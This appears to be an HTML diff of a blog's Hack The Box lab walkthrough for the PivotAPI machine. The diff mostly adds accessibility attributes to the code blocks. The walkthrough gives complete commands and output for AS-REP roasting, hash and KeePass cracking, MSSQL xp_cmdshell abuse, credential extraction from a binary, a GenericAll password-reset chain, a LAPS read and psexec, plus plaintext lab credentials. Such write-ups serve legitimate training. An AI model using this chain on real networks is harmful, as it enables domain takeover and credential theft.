+<pre tabindex="0" aria-label="bash code or terminal block 7"><code class="language-bash" data-language="bash">exiftool ftp/*.pdf | grep -iE "Creator|Author" | awk '{print $3}' | sort -u &gt; users.txt
 </code></pre>
 <p><strong>Contents of <code>users.txt</code>:</strong></p>
-<pre><code>alex
+<pre tabindex="0" aria-label="Code or terminal block 8"><code>alex
 byron
 cairo
 Kaorz
@@ -108,7 +113,7 @@ saif
 <p><strong>Why does this exist?</strong> Some legacy systems or misconfigured accounts disable preauth for compatibility. It's a common AD misconfiguration.</p>
 <h3 id="step-3-2-running-getnpusers">Step 3.2: Running GetNPUsers</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">impacket-GetNPUsers.py -dc-ip 10.129.228.115 -no-pass -usersfile users.txt LicorDeBellota.htb/
+<pre tabindex="0" aria-label="bash code or terminal block 9"><code class="language-bash" data-language="bash">impacket-GetNPUsers.py -dc-ip 10.129.228.115 -no-pass -usersfile users.txt LicorDeBellota.htb/
 </code></pre>
 <p><strong>What happens:</strong></p>
 <ul>
@@ -120,7 +125,7 @@ saif
 <h3 id="step-3-3-cracking-the-hash">Step 3.3: Cracking the Hash</h3>
 <p>The hash format is <code>krb5asrep$23$</code>, which corresponds to <strong>Hashcat mode 18200</strong> or John the Ripper's default krb5asrep format.</p>
 <p><strong>Commands:</strong></p>
-<pre><code class="language-bash" data-language="bash"># Save the hash
+<pre tabindex="0" aria-label="bash code or terminal block 10"><code class="language-bash" data-language="bash"># Save the hash
 echo 'REDACTED_KERBEROS_MATERIAL' &gt; kaorz.hash
 
 # Crack with John
@@ -136,7 +141,7 @@ hashcat -m 18200 kaorz.hash /usr/share/wordlists/rockyou.txt
 <h3 id="step-4-1-discovering-smb-shares">Step 4.1: Discovering SMB Shares</h3>
 <p>With valid domain credentials (<code>Kaorz:Roper4155</code>), we can now enumerate SMB shares. SMB is the Windows file sharing protocol, and shares often contain sensitive files, scripts, or configuration backups.</p>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">impacket-smbclient LicorDeBellota.htb/Kaorz:'Roper4155'@10.129.228.115
+<pre tabindex="0" aria-label="bash code or terminal block 11"><code class="language-bash" data-language="bash">impacket-smbclient LicorDeBellota.htb/Kaorz:'Roper4155'@10.129.228.115
 </code></pre>
 <p><strong>Shares accessible:</strong></p>
 <ul>
@@ -155,7 +160,7 @@ hashcat -m 18200 kaorz.hash /usr/share/wordlists/rockyou.txt
 <li><code>WinRM Service.msg</code> (26KB)</li>
 </ul>
 <p><strong>Commands:</strong></p>
-<pre><code class="language-bash" data-language="bash">smbclient //10.129.228.115/NETLOGON -U LicorDeBellota.htb/Kaorz%Roper4155
+<pre tabindex="0" aria-label="bash code or terminal block 12"><code class="language-bash" data-language="bash">smbclient //10.129.228.115/NETLOGON -U LicorDeBellota.htb/Kaorz%Roper4155
 cd HelpDesk
 get Restart-OracleService.exe
 get "Server MSSQL.msg"
@@ -164,7 +169,7 @@ get "WinRM Service.msg"
 <h3 id="step-4-3-analyzing-the-msg-emails">Step 4.3: Analyzing the .MSG Emails</h3>
 <p>The <code>.msg</code> files are Outlook messages. We convert them to readable <code>.eml</code> format:</p>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">sudo apt-get install libemail-outlook-message-perl
+<pre tabindex="0" aria-label="bash code or terminal block 13"><code class="language-bash" data-language="bash">sudo apt-get install libemail-outlook-message-perl
 msgconvert *.msg
 </code></pre>
 <p><strong>Email 1: "Server MSSQL"</strong></p>
@@ -188,7 +193,7 @@ msgconvert *.msg
 <h2 id="phase-5-binary-reversing-and-the-oracle-mssql-pivot">Phase 5: Binary reversing and the Oracle/MSSQL pivot</h2>
 <h3 id="step-5-1-the-reversing-challenge">Step 5.1: The Reversing Challenge</h3>
 <p><code>Restart-OracleService.exe</code> is a heavily obfuscated/packed 64-bit PE. Running <code>strings</code> on it yields mostly garbage plus one clue:</p>
-<pre><code>inflate 1.2.11 Copyright 1995-2017 Mark Adler
+<pre tabindex="0" aria-label="Code or terminal block 14"><code>inflate 1.2.11 Copyright 1995-2017 Mark Adler
 </code></pre>
 <p>This indicates <strong>Zlib compression</strong> is used. Static analysis with Ghidra is difficult because the binary appears to be custom-packed with no obvious imports.</p>
 <h3 id="step-5-2-dynamic-analysis-strategy">Step 5.2: Dynamic Analysis Strategy</h3>
@@ -196,7 +201,7 @@ msgconvert *.msg
 <ol>
 <li><strong>Procmon</strong> (Process Monitor) from Sysinternals captures all file, registry, and process events</li>
 <li>Running the binary reveals it creates a random <code>.bat</code> file in <code>%TEMP%</code>, executes it, then deletes it</li>
-<li>Using <strong>CMDWatcher</strong> or a PowerShell loop, we intercept the <code>.bat</code> file before deletion:<pre><code class="language-powershell" data-language="powershell">while($true) { ls -Path .\AppData\Local\Temp\*.tmp -recurse -filter *.bat | ForEach-Object { copy $_.fullname .\$_name }}
+<li>Using <strong>CMDWatcher</strong> or a PowerShell loop, we intercept the <code>.bat</code> file before deletion:<pre tabindex="0" aria-label="powershell code or terminal block 15"><code class="language-powershell" data-language="powershell">while($true) { ls -Path .\AppData\Local\Temp\*.tmp -recurse -filter *.bat | ForEach-Object { copy $_.fullname .\$_name }}
 </code></pre>
 </li>
 </ol>
@@ -211,7 +216,7 @@ msgconvert *.msg
 <p>By modifying the <code>.bat</code> to remove user checks and delete commands, we recover <code>restart-service.exe</code>.</p>
 <h3 id="step-5-4-api-monitor-credential-extraction">Step 5.4: API Monitor - Credential Extraction</h3>
 <p>Running <code>restart-service.exe</code> under <strong>API Monitor</strong> and filtering for <code>CreateProcessWithLogonW</code> reveals:</p>
-<pre><code>Username: svc_oracle
+<pre tabindex="0" aria-label="Code or terminal block 16"><code>Username: svc_oracle
 Password: REDACTED
 </code></pre>
 
@@ -242,7 +247,7 @@ Password: REDACTED
 </tr>
 </tbody></table>
 <p><strong>Testing:</strong></p>
-<pre><code class="language-bash" data-language="bash">impacket-mssqlclient.py 'sa:#mssql_s3rV1c3!2020@10.129.228.115'
+<pre tabindex="0" aria-label="bash code or terminal block 17"><code class="language-bash" data-language="bash">impacket-mssqlclient.py 'sa:#mssql_s3rV1c3!2020@10.129.228.115'
 </code></pre>
 <p><strong>Result:</strong> SUCCESSFUL LOGIN!</p>
 
@@ -251,7 +256,7 @@ Password: REDACTED
 <h3 id="step-6-1-gaining-mssql-shell-access">Step 6.1: Gaining MSSQL Shell Access</h3>
 <p>With the derived credentials <code>sa:#mssql_s3rV1c3!2020</code>, we connect to the MSSQL instance.</p>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">impacket-mssqlclient 'sa:#mssql_s3rV1c3!2020@10.129.228.115'
+<pre tabindex="0" aria-label="bash code or terminal block 18"><code class="language-bash" data-language="bash">impacket-mssqlclient 'sa:#mssql_s3rV1c3!2020@10.129.228.115'
 </code></pre>
 <p><strong>What we see:</strong></p>
 <ul>
@@ -263,11 +268,11 @@ Password: REDACTED
 <h3 id="step-6-2-enabling-xp-cmdshell">Step 6.2: Enabling xp_cmdshell</h3>
 <p><code>xp_cmdshell</code> is a stored procedure that executes arbitrary Windows commands. It's disabled by default for security reasons, but <code>sa</code> can re-enable it.</p>
 <p><strong>Commands:</strong></p>
-<pre><code class="language-sql" data-language="sql">enable_xp_cmdshell
+<pre tabindex="0" aria-label="sql code or terminal block 19"><code class="language-sql" data-language="sql">enable_xp_cmdshell
 xp_cmdshell whoami
 </code></pre>
 <p><strong>Output:</strong></p>
-<pre><code>nt service\mssql$sqlexpress
+<pre tabindex="0" aria-label="Code or terminal block 20"><code>nt service\mssql$sqlexpress
 </code></pre>
 <p><strong>Analysis:</strong> We are running as the MSSQL service account - not a regular user. This is both good and bad:</p>
 <ul>
@@ -276,20 +281,20 @@ xp_cmdshell whoami
 </ul>
 <h3 id="step-6-3-checking-privileges">Step 6.3: Checking Privileges</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-sql" data-language="sql">xp_cmdshell whoami /priv
+<pre tabindex="0" aria-label="sql code or terminal block 21"><code class="language-sql" data-language="sql">xp_cmdshell whoami /priv
 </code></pre>
 <p><strong>Critical Output:</strong></p>
-<pre><code>SeImpersonatePrivilege        Suplantar a un cliente tras la autenticación      Habilitada
+<pre tabindex="0" aria-label="Code or terminal block 22"><code>SeImpersonatePrivilege        Suplantar a un cliente tras la autenticación      Habilitada
 </code></pre>
 <p><strong>What is SeImpersonatePrivilege?</strong> This privilege allows a process to impersonate another user's security context after authentication. It's a <strong>classic privilege escalation vector</strong> on Windows services. Tools like <strong>PrintSpoofer</strong>, <strong>JuicyPotato</strong>, and <strong>RoguePotato</strong> abuse this to escalate from service account to SYSTEM.</p>
 <h3 id="step-6-4-the-printspoofer-gamble-and-why-it-failed">Step 6.4: The PrintSpoofer Gamble (And Why It Failed)</h3>
 
 <p>We upload <strong>PrintSpoofer64.exe</strong> (a tool that abuses the Print Spooler service to get SYSTEM) through the MSSQL <code>upload</code> command:</p>
-<pre><code class="language-sql" data-language="sql">upload PrintSpoofer64.exe C:\windows\temp\PrintSpoofer64.exe
+<pre tabindex="0" aria-label="sql code or terminal block 23"><code class="language-sql" data-language="sql">upload PrintSpoofer64.exe C:\windows\temp\PrintSpoofer64.exe
 xp_cmdshell C:\windows\temp\PrintSpoofer64.exe -c "powershell -c type C:\Users\3v4Si0N\Desktop\user.txt"
 </code></pre>
 <p><strong>Result:</strong></p>
-<pre><code>[+] Found privilege: SeImpersonatePrivilege
+<pre tabindex="0" aria-label="Code or terminal block 24"><code>[+] Found privilege: SeImpersonatePrivilege
 [+] Named pipe listening...
 [-] Operation failed or timed out.
 </code></pre>
@@ -318,7 +323,7 @@ xp_cmdshell C:\windows\temp\PrintSpoofer64.exe -c "powershell -c type C:\Users\3
 <p><strong>Key Insight:</strong> <code>svc_mssql</code> has a desktop folder. Domain users often store files on their desktops. If we can run commands as <code>svc_mssql</code>, we can browse their files.</p>
 <h3 id="step-7-3-discovering-the-keepass-database">Step 7.3: Discovering the KeePass Database</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-powershell" data-language="powershell">$user='LicorDeBellota.htb\svc_mssql'
+<pre tabindex="0" aria-label="powershell code or terminal block 25"><code class="language-powershell" data-language="powershell">$user='LicorDeBellota.htb\svc_mssql'
 $pass = ConvertTo-SecureString '#mssql_s3rV1c3!2020' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential($user, $pass)
 Invoke-Command -Credential $cred -ComputerName PivotAPI -ScriptBlock {
@@ -337,7 +342,7 @@ Invoke-Command -Credential $cred -ComputerName PivotAPI -ScriptBlock {
 <li>Decode it on our Kali machine</li>
 </ol>
 <p><strong>PowerShell Script (<code>get_kdbx.ps1</code>):</strong></p>
-<pre><code class="language-powershell" data-language="powershell">$user='LicorDeBellota.htb\svc_mssql'
+<pre tabindex="0" aria-label="powershell code or terminal block 26"><code class="language-powershell" data-language="powershell">$user='LicorDeBellota.htb\svc_mssql'
 $pass = ConvertTo-SecureString '#mssql_s3rV1c3!2020' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential($user, $pass)
 Invoke-Command -ScriptBlock {
@@ -346,14 +351,14 @@ Invoke-Command -ScriptBlock {
 } -ComputerName PivotAPI -Credential $cred
 </code></pre>
 <p><strong>Execution from MSSQL:</strong></p>
-<pre><code class="language-sql" data-language="sql">upload get_kdbx.ps1 C:\windows\temp\get_kdbx.ps1
+<pre tabindex="0" aria-label="sql code or terminal block 27"><code class="language-sql" data-language="sql">upload get_kdbx.ps1 C:\windows\temp\get_kdbx.ps1
 xp_cmdshell powershell -ExecutionPolicy Bypass -File C:\windows\temp\get_kdbx.ps1
 xp_cmdshell type C:\programdata\creds.b64
 </code></pre>
 
 <h3 id="step-7-5-decoding-on-kali">Step 7.5: Decoding on Kali</h3>
 <p>Copy the massive base64 block from the MSSQL output and save it to <code>creds.b64</code>:</p>
-<pre><code class="language-bash" data-language="bash">base64 -d creds.b64 &gt; credentials.kdbx
+<pre tabindex="0" aria-label="bash code or terminal block 28"><code class="language-bash" data-language="bash">base64 -d creds.b64 &gt; credentials.kdbx
 file credentials.kdbx
 # Output: Keepass password database 2.x KDBX
 </code></pre>
@@ -362,23 +367,23 @@ file credentials.kdbx
 <h3 id="step-8-1-extracting-the-keepass-hash">Step 8.1: Extracting the KeePass Hash</h3>
 <p>KeePass databases use strong key derivation (AES-KDF or Argon2), making brute-force expensive. However, <code>keepass2john</code> extracts a hash format that John the Ripper and Hashcat can attack.</p>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">keepass2john credentials.kdbx &gt; keepass.hash
+<pre tabindex="0" aria-label="bash code or terminal block 29"><code class="language-bash" data-language="bash">keepass2john credentials.kdbx &gt; keepass.hash
 john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
 </code></pre>
 <p><strong>Result:</strong> <code>mahalkita</code></p>
 <p><strong>Why did this crack so fast?</strong> The password <code>REDACTED</code> is in <code>rockyou.txt</code>. Despite KeePass using 60,000+ iterations of key stretching, a single GPU or CPU core can test thousands of passwords per second against common wordlists.</p>
 <h3 id="step-8-2-opening-the-keepass-database">Step 8.2: Opening the KeePass Database</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">echo "mahalkita" | kpcli -kdb credentials.kdbx
+<pre tabindex="0" aria-label="bash code or terminal block 30"><code class="language-bash" data-language="bash">echo "mahalkita" | kpcli -kdb credentials.kdbx
 </code></pre>
 <p><strong>Navigation inside kpcli:</strong></p>
-<pre><code>cd Database
+<pre tabindex="0" aria-label="Code or terminal block 31"><code>cd Database
 cd Windows
 ls
 show -f SSH
 </code></pre>
 <p><strong>Critical Finding:</strong></p>
-<pre><code>Title: SSH
+<pre tabindex="0" aria-label="Code or terminal block 32"><code>Title: SSH
 Uname: 3v4Si0N
 Pass: Gu4nCh3C4NaRi0N!23
 </code></pre>
@@ -387,11 +392,11 @@ Pass: Gu4nCh3C4NaRi0N!23
 <h2 id="phase-9-user-flag-capture">Phase 9: User Flag Capture</h2>
 <h3 id="step-9-1-ssh-access-as-3v4si0n">Step 9.1: SSH Access as 3v4Si0N</h3>
 <p>With valid SSH credentials, we connect:</p>
-<pre><code class="language-bash" data-language="bash">sshpass -p REDACTED ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null 3v4Si0N@10.129.228.115
+<pre tabindex="0" aria-label="bash code or terminal block 33"><code class="language-bash" data-language="bash">sshpass -p REDACTED ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null 3v4Si0N@10.129.228.115
 </code></pre>
 <p><strong>Why SSH and not WinRM?</strong> The emails explicitly state WinRM is blocked externally. SSH (port 22) is accessible from the outside. <code>3v4Si0N</code> is a member of the <strong>SSH</strong> group.</p>
 <h3 id="step-9-2-reading-the-user-flag">Step 9.2: Reading the User Flag</h3>
-<pre><code class="language-cmd" data-language="cmd">type C:\Users\3v4Si0N\Desktop\user.txt
+<pre tabindex="0" aria-label="cmd code or terminal block 34"><code class="language-cmd" data-language="cmd">type C:\Users\3v4Si0N\Desktop\user.txt
 </code></pre>
 <p><strong>User Flag:</strong> <code>6a3517[redacted]f862f3c15</code></p>
 <hr>
@@ -399,7 +404,7 @@ Pass: Gu4nCh3C4NaRi0N!23
 <h3 id="step-10-1-understanding-the-ad-attack-graph">Step 10.1: Understanding the AD Attack Graph</h3>
 <p>This is where PivotAPI gets its name. To reach Domain Admin (and thus the root flag), we must pivot through <strong>multiple user accounts</strong>, each controlled by the previous one. This is a classic <strong>Active Directory privilege escalation chain</strong>.</p>
 <p><strong>The Chain (from BloodHound analysis):</strong></p>
-<pre><code>3v4Si0N ---[GenericAll]---&gt; Dr.Zaiuss ---[GenericAll]---&gt; superfume
+<pre tabindex="0" aria-label="Code or terminal block 35"><code>3v4Si0N ---[GenericAll]---&gt; Dr.Zaiuss ---[GenericAll]---&gt; superfume
     |
     | (access to C:\Developers\jari)
     v
@@ -418,20 +423,20 @@ Lothbrok reads ms-mcs-admpwd for administrador
 <h3 id="step-10-2-uploading-powerview">Step 10.2: Uploading PowerView</h3>
 <p>PowerView is a PowerShell reconnaissance tool that exposes AD objects and relationships. The <code>dev</code> branch of PowerSploit contains the most up-to-date version.</p>
 <p><strong>On Kali:</strong></p>
-<pre><code class="language-bash" data-language="bash">git clone --depth 1 --branch dev https://github.com/PowerShellMafia/PowerSploit.git /tmp/PowerSploit
+<pre tabindex="0" aria-label="bash code or terminal block 36"><code class="language-bash" data-language="bash">git clone --depth 1 --branch dev https://github.com/PowerShellMafia/PowerSploit.git /tmp/PowerSploit
 sshpass -p REDACTED scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
   /tmp/PowerSploit/Recon/PowerView.ps1 3v4Si0N@10.129.228.115:'C:\programdata\pv.ps1'
 </code></pre>
 <p><strong>On Target:</strong></p>
-<pre><code class="language-powershell" data-language="powershell">Import-Module C:\programdata\pv.ps1
+<pre tabindex="0" aria-label="powershell code or terminal block 37"><code class="language-powershell" data-language="powershell">Import-Module C:\programdata\pv.ps1
 </code></pre>
 <h3 id="step-10-3-changing-dr-zaiuss-password">Step 10.3: Changing Dr.Zaiuss Password</h3>
-<pre><code class="language-powershell" data-language="powershell">$pass = ConvertTo-SecureString 'Password123!!' -AsPlainText -Force
+<pre tabindex="0" aria-label="powershell code or terminal block 38"><code class="language-powershell" data-language="powershell">$pass = ConvertTo-SecureString 'Password123!!' -AsPlainText -Force
 Set-DomainUserPassword -Identity dr.zaiuss -AccountPassword $pass
 </code></pre>
 <p><strong>Mechanism:</strong> <code>3v4Si0N</code> has <strong>GenericAll</strong> on <code>Dr.Zaiuss</code>. GenericAll includes the permission to change the target's password.</p>
 <h3 id="step-10-4-changing-superfume-password-via-dr-zaiuss">Step 10.4: Changing superfume Password (via Dr.Zaiuss)</h3>
-<pre><code class="language-powershell" data-language="powershell">$pass = ConvertTo-SecureString 'Password123!!' -AsPlainText -Force
+<pre tabindex="0" aria-label="powershell code or terminal block 39"><code class="language-powershell" data-language="powershell">$pass = ConvertTo-SecureString 'Password123!!' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('licordebellota\dr.zaiuss', $pass)
 Set-DomainUserPassword -Identity superfume -AccountPassword $pass -Credential $cred
 </code></pre>
@@ -446,13 +451,13 @@ Set-DomainUserPassword -Identity superfume -AccountPassword $pass -Credential $c
 <p><strong><code>Cos@Chung@!RPG</code></strong></p>
 <p><em>(On a Windows VM with dnSpy, you would set a breakpoint after <code>RC4.Decrypt</code> and read the plaintext from memory.)</em></p>
 <h3 id="step-10-6-changing-gibdeon-password-via-jari">Step 10.6: Changing Gibdeon Password (via Jari)</h3>
-<pre><code class="language-powershell" data-language="powershell">$jari_pass = ConvertTo-SecureString 'Cos@Chung@!RPG' -AsPlainText -Force
+<pre tabindex="0" aria-label="powershell code or terminal block 40"><code class="language-powershell" data-language="powershell">$jari_pass = ConvertTo-SecureString 'Cos@Chung@!RPG' -AsPlainText -Force
 $jari_cred = New-Object System.Management.Automation.PSCredential('licordebellota\jari', $jari_pass)
 $pass = ConvertTo-SecureString 'Password123!!' -AsPlainText -Force
 Set-DomainUserPassword -Identity gibdeon -AccountPassword $pass -Credential $jari_cred
 </code></pre>
 <h3 id="step-10-7-changing-lothbrok-password-via-gibdeon">Step 10.7: Changing Lothbrok Password (via Gibdeon)</h3>
-<pre><code class="language-powershell" data-language="powershell">$gibdeon_cred = New-Object System.Management.Automation.PSCredential('licordebellota\gibdeon', $pass)
+<pre tabindex="0" aria-label="powershell code or terminal block 41"><code class="language-powershell" data-language="powershell">$gibdeon_cred = New-Object System.Management.Automation.PSCredential('licordebellota\gibdeon', $pass)
 Set-DomainUserPassword -Identity lothbrok -AccountPassword $pass -Credential $gibdeon_cred
 </code></pre>
 <p><strong>Why Lothbrok?</strong> Gibdeon is in <strong>Account Operators</strong>. Account Operators can modify most users. Lothbrok is a member of <strong>LAPS READ</strong>, which can read local administrator passwords.</p>
@@ -461,11 +466,11 @@ Set-DomainUserPassword -Identity lothbrok -AccountPassword $pass -Credential $gi
 <h2 id="phase-11-laps-the-final-key">Phase 11: LAPS - The Final Key</h2>
 <h3 id="step-11-1-reading-the-laps-password">Step 11.1: Reading the LAPS Password</h3>
 <p>With Lothbrok's credentials, we query the computer object for the <code>ms-mcs-admpwd</code> attribute:</p>
-<pre><code class="language-powershell" data-language="powershell">$lothbrok_cred = New-Object System.Management.Automation.PSCredential('licordebellota\lothbrok', $pass)
+<pre tabindex="0" aria-label="powershell code or terminal block 42"><code class="language-powershell" data-language="powershell">$lothbrok_cred = New-Object System.Management.Automation.PSCredential('licordebellota\lothbrok', $pass)
 Get-DomainComputer PivotAPI -Credential $lothbrok_cred -Properties "ms-mcs-AdmPwd",name
 </code></pre>
 <p><strong>Output:</strong></p>
-<pre><code>name     ms-mcs-admpwd
+<pre tabindex="0" aria-label="Code or terminal block 43"><code>name     ms-mcs-admpwd
 ----     -------------
 PIVOTAPI 5w5idgPB58tCVP8o99uq
 </code></pre>
@@ -488,10 +493,10 @@ PIVOTAPI 5w5idgPB58tCVP8o99uq
 <li><strong>SMB + PSExec:</strong> Works perfectly because <code>administrador</code> is Domain Admin</li>
 </ul>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">impacket-psexec 'administrador:5w5idgPB58tCVP8o99uq@10.129.228.115'
+<pre tabindex="0" aria-label="bash code or terminal block 44"><code class="language-bash" data-language="bash">impacket-psexec 'administrador:5w5idgPB58tCVP8o99uq@10.129.228.115'
 </code></pre>
 <h3 id="step-12-2-reading-the-root-flag">Step 12.2: Reading the Root Flag</h3>
-<pre><code class="language-cmd" data-language="cmd">type C:\Users\cybervaca\Desktop\root.txt
+<pre tabindex="0" aria-label="cmd code or terminal block 45"><code class="language-cmd" data-language="cmd">type C:\Users\cybervaca\Desktop\root.txt
 </code></pre>
 <p><strong>Root Flag:</strong> <code>f913a1[redacted]7cafe68b1</code></p>
 <p><strong>Why is root.txt on cybervaca's desktop?</strong> <code>cybervaca</code> is the other Domain Admin. On HackTheBox, root flags are typically placed on the desktop of a secondary admin account, not the primary <code>Administrator</code>/<code>administrador</code> account. As Domain Admin, <code>administrador</code> has read access to all user profiles.</p>
@@ -519,7 +524,7 @@ PIVOTAPI 5w5idgPB58tCVP8o99uq
 <p>LAPS is an excellent defense-in-depth tool, but if any non-admin user can read <code>ms-mcs-admpwd</code>, it becomes a liability. audit LAPS group memberships.</p>
 <hr>
 <h2 id="full-command-reference">Full Command Reference</h2>
-<pre><code class="language-bash" data-language="bash"># Recon
+<pre tabindex="0" aria-label="bash code or terminal block 46"><code class="language-bash" data-language="bash"># Recon
 echo "10.129.228.115 pivotapi.licordebellota.htb licordebellota.htb" | sudo tee -a /etc/hosts
 sudo nmap -p 21,22,53,88,135,139,389,445,464,593,636,1433,3268,3269,9389 -sCV --min-rate 5000 10.129.228.115
 
@@ -584,9 +589,5 @@ impacket-psexec 'administrador:5w5idgPB58tCVP8o99uq@10.129.228.115'
 type C:\Users\cybervaca\Desktop\root.txt
 </code></pre>
 <hr>
-<p><em>Walkthrough created based on analysis of three independent writeups and direct exploitation of the PivotAPI machine on HackTheBox.</em></p>c:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$12"}}]
-d:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-querier-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Querier Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T16:04:41.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-multimaster-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Multimaster Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T16:00:13.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
-e:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L13",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
-14:T57b,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-pivotapi-walkthrough/#article","headline":"Hack The Box: PivotAPI Walkthrough","description":"Anonymous FTP metadata and AS-REP roasting open SMB, where reversing a helpdesk binary yields SQL access and a KeePass-backed SSH foothold before an AD password-reset chain exposes LAPS administrator credentials.","url":"https://cyberkareem.com/writing/hackthebox-pivotapi-walkthrough/","datePublished":"2026-06-11T16:02:11.000Z","dateModified":"2026-06-11T16:02:11.000Z","wordCount":3309,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSEP-Prep/blob/2b42f3e85f9438be22d5df95da895e961088e35e/HTB-PivotAPI.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-pivotapi-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-pivotapi-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: PivotAPI Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-pivotapi-walkthrough/"}]}]}f:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$14"}}]
-10:["$","$L15",null,{"children":["$","$16",null,{"name":"Next.MetadataOutlet","children":"$@17"}]}]
+<p><em>Walkthrough created based on analysis of three independent writeups and direct exploitation of the PivotAPI machine on HackTheBox.</em></p>12:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$18"}}]
 17:null
